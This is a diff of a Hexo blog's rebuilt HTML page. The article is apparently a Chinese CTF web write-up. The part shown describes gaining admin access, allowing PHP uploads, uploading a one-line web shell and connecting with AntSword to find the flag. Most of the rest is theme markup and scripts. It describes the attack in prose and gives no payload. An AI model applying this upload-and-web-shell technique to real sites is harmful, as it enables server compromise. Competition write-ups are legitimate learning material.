 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MaoGeYaoQiFeiLa</span><br></pre></td></tr></table></figure>
 
 <p>登录上去:</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731175101839-20220805163300269.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731175101839.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731175101839-20220805163300269.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731175101839.png"></p>
 <p>本来这里一开始看到这个插件</p>
 <p>想到一开始附件里面还有一个插件,那个插件会不会导致rce啥的,可能进入后台后才能利用那个插件的cve,但是想错了,那个插件没有没有用</p>
 <p>然后想到一开始在文件上传的时候是不允许上传这个php结尾的数据的,值允许上传jpg,png这些</p>
 <p>这里因为在后台,那么找到了这个修改页面:</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731175407087-20220805163300340.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731175407087.png"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731175407087-20220805163300340.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731175407087.png"></p>
 <p>这里直接添加php后缀的规则,然后反手在文件上传的地方上传了一个一句话木马</p>
 <p>使用蚁剑连接上去</p>
 <p>一开始没找到flag,看了tmp目录,使用了find命令,和history 甚至看了看日志都没发现</p>
 <p>最后在这个&#x2F;usr&#x2F;local下找到了flag</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731175457147-20220805163344493.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731175457147.png"></p>
-
-    </article>
-    <!-- license -->
-    
-        <div class="license-wrapper">
-            <p>Author：<a href="http://w0s1np.github.io">w0s1np</a>
-            <p>Link：<a href="http://w0s1np.github.io/2022/08/05/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWeb-wp/">http://w0s1np.github.io/2022/08/05/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWeb-wp/</a>
-            <p>Publish date：<a href="http://w0s1np.github.io/2022/08/05/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWeb-wp/">August 5th 2022, 4:28:42 pm</a>
-            <p>Update date：<a href="http://w0s1np.github.io/2022/08/05/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWeb-wp/">August 5th 2022, 4:35:48 pm</a>
-            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
-        </div>
-    
-    <!-- paginator -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2022/07/18/2022-DSCTF/" title="2022 DSCTF">
-                    <div class="prevTitle">2022 DSCTF</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- comment -->
-    
-        <div class="post-comment">
-            <!-- 来必力 City 版安装代码 -->
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731175457147-20220805163344493.png" alt="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image-20220731175457147.png"></p>
 
 
-            
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a>许可协议，转载请注明出处。</p>
+</div></section></div>
 
-            
+</article>
 
-            
-
-            <!-- utteranc评论 -->
-
-
-            <!-- partial('_partial/comment/changyan') -->
-            <!--PC版-->
-
-
-            
-            
-
-            
-
-        </div>
-    
-    <!-- timeliness note -->
-    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
-    
-    <!-- Mathjax -->
-    
-</main>
-
-                <!-- profile -->
-                
-            </div>
-            <footer class="footer footer-unloaded">
-    <!-- social  -->
-    
-        <div class="social">
-            
-    
-        
-            
-                <a href="mailto:w0s1np.foxmail.com" class="iconfont-archer email" title=email ></a>
-            
-        
-    
-        
-            
-                <a href="//github.com/w0s1np" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
-    
-        
-            
-                <span class="iconfont-archer wechat" title=wechat>
-                    
-                    <img class="profile-qr" src="/assets/w0s1np.jpg" />
-                </span>
-            
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-
-
-        </div>
-    
-    <!-- powered by Hexo  -->
-    <div class="copyright">
-        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
-    </div>
-    <!-- website approve for Chinese user -->
-    
-    <!-- 不蒜子  -->
-    
-        <div class="busuanzi-container">
-            
-             
-                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
-            
-        </div>
-    	
-</footer>
-
-        </div>
-        <!-- toc -->
-        
-            <div class="toc-wrapper toc-wrapper-loding" style=
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>接下来阅读</span></section><section class="body fs14"><a id="next" href="/2022/07/18/2022-DSCTF/">2022 DSCTF<span class="note">较早</span></a><div class="line"></div></section></div>
 
 
 
@@ -858,303 +317,167 @@
 
 
 
-    top:50vh;
 
->
-                <div class="toc-catalog">
-                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-                </div>
-                <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#rcefile"><span class="toc-number">1.</span> <span class="toc-text">rcefile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyweb"><span class="toc-number">2.</span> <span class="toc-text">babyweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crash"><span class="toc-number">3.</span> <span class="toc-text">crash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyweb"><span class="toc-number">4.</span> <span class="toc-text">easyweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easylogin"><span class="toc-number">5.</span> <span class="toc-text">easylogin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WP-UM"><span class="toc-number">6.</span> <span class="toc-text">WP-UM</span></a></li></ol>
-            </div>
-        
-        <!-- sidebar -->
-        <div class="sidebar sidebar-hide">
-    <ul class="sidebar-tabs sidebar-tabs-active-0">
-        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
-        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
-        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
-    </ul>
-    <div class="sidebar-content sidebar-content-show-archive">
-        <div class="sidebar-panel-archives">
-    <!-- 在 ejs 中将 archive 按照时间排序 -->
-    
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-    
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-    
-    
-    
-    
-    <div class="total-and-search">
-        <div class="total-archive">
-        Total : 11
-        </div>
-        <!-- search  -->
-        
-    </div>
-    
-    <div class="post-archive">
-    
-        
-            
-            
-            <div class="archive-year"> 2022 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/05</span>
-            <a class="archive-post-title" href="/2022/08/05/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFWeb-wp/">第六届强网杯Web wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/18</span>
-            <a class="archive-post-title" href="/2022/07/18/2022-DSCTF/">2022 DSCTF</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/22</span>
-            <a class="archive-post-title" href="/2022/06/22/Java-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">Java-XMLDecoder反序列化分析</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/22</span>
-            <a class="archive-post-title" href="/2022/06/22/JDBC/">JDBC</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/22</span>
-            <a class="archive-post-title" href="/2022/06/22/Java-%E5%8E%9F%E7%94%9Fgadget/">Java 原生gadget</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/26</span>
-            <a class="archive-post-title" href="/2022/04/26/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcat Servlet 内存马</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/26</span>
-            <a class="archive-post-title" href="/2022/04/26/Tomcat-Listener-%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcat Listener 内存马</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/25</span>
-            <a class="archive-post-title" href="/2022/04/25/Tomcat-Filter-%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcat Filter 内存马</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/31</span>
-            <a class="archive-post-title" href="/2022/03/31/Java-JNDI-Inject/">Java JNDI Inject</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/31</span>
-            <a class="archive-post-title" href="/2022/03/31/java-RMI%D1%A7%CF%B0/">java RMI学习</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/31</span>
-            <a class="archive-post-title" href="/2022/03/31/hello-world/">Hello World</a>
-        </li>
-    
-    </div>
-</div>
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>本站由 <a href="/">@w0s1np</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
 
-        <div class="sidebar-panel-tags">
-    <div class="sidebar-tags-name">
-        
-            <span class="sidebar-tag-name" data-tags="javasec">
-                <span class="iconfont-archer">&#xe606;</span>
-                javasec
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="wp">
-                <span class="iconfont-archer">&#xe606;</span>
-                wp
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="JDBC">
-                <span class="iconfont-archer">&#xe606;</span>
-                JDBC
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="XML">
-                <span class="iconfont-archer">&#xe606;</span>
-                XML
-            </span>
-        
-    </div>
-    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
-    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
-        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
-    </div> 
-    <div class="sidebar-tags-list"></div>
-</div>
-
-        <div class="sidebar-panel-categories">
-    <div class="sidebar-categories-name">
-    
-    </div>
-    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
-    <div class="sidebar-categories-list"></div>
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
 </div>
 
     </div>
-</div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
 
-        <!-- site-meta -->
-        <script>
-    var siteMetaRoot = "/"
-    if (siteMetaRoot === "undefined") {
-        siteMetaRoot = '/'
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
     }
-    var siteMeta = {
-        url: "http://w0s1np.github.io",
-        root: siteMetaRoot,
-        author: "w0s1np"
-    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.10.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://fastly.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js'
+  };
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://fastly.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://fastly.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://fastly.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://fastly.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://fastly.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://fastly.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti/umd/heti.min.css","js":"https://unpkg.com/heti/umd/heti-addon.min.js"});
+  }
 </script>
 
-        <!-- import experimental options here -->
-        <!-- Custom Font -->
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
 
 
-        <!-- main func -->
-        <script src="/scripts/main.js?v=20211217"></script>
-        <!-- dark mode -->
-        <script src="/scripts/dark.js?v=20211217"></script>
-        <!-- fancybox -->
-        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
-        <!-- algolia -->
-        
-        <!-- busuanzi -->
-        
-            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
-        
-        <!-- CNZZ -->
-        
-        <!-- async load share.js -->
-        
-            <script src="/scripts/share.js?v=20211217" async></script>
-        
-        <!-- mermaid -->
-        
-    </body>
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
 </html>
